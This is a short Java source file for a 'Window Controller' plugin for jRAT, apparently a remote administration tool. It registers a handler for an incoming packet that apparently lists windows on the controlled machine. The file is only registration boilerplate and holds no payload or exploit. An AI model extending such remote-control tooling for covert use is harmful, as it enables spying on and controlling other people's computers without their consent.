package se.jrat.plugin.window.client;

import jrat.api.Plugin;
import jrat.api.net.Packet;

public class WindowPlugin extends Plugin {
	
	public static final byte HEADER_LIST = -127;

	public WindowPlugin() {
		super("Window Controller", "1.0", "Window Controller Plugin", "jRAT");
		
		Packet.registerIncoming(HEADER_LIST, new ListPacketListener());
	}

}
